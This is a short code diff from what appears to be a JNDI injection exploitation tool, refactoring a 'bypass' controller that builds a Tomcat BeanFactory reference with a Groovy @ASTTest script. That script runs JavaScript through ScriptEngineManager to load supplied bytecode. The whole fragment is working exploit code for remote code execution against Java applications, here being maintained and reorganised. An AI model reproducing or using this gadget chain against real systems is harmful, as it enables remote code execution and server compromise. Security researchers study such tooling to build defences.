@@ -3,7 +3,7 @@ package map.jndi.controller.bypass;
 import map.jndi.annotation.JNDIController;
 import map.jndi.annotation.JNDIMapping;
 import map.jndi.controller.BasicController;
-import map.jndi.util.PayloadUtil;
+import map.jndi.payload.JavaScriptPayload;
 import org.apache.naming.ResourceRef;
 
 import javax.naming.StringRefAddr;
@@ -15,7 +15,7 @@ public class GroovyClassLoaderController extends BasicController {
     public Object process(byte[] byteCode) {
         System.out.println("[Reference] Factory: BeanFactory + GroovyClassLoader");
 
-        String code = PayloadUtil.getJavaScriptPayload(byteCode);
+        String code = JavaScriptPayload.loadClass(byteCode);
         String script = "@groovy.transform.ASTTest(value={\n" +
                 "    assert Class.forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"" + code + "\")\n" +
                 "})\n" +
